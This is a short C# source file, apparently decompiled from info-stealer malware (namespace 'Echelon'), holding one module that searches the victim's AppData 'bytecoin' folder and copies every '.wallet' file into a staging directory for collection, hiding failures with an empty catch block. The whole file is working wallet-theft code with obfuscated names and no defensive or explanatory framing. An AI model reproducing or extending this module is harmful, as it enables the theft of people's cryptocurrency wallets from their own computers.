using Echelon;
using System.IO;

internal class @as
{
	public static void a(string jn)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\bytecoin").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jn + "\\Wallets\\Bytecoin\\");
				if (fileInfo.Extension.Equals(".wallet"))
				{
					fileInfo.CopyTo(jn + "\\Bytecoin\\" + fileInfo.Name);
				}
			}
			ba.a++;
		}
		catch
		{
		}
	}
}
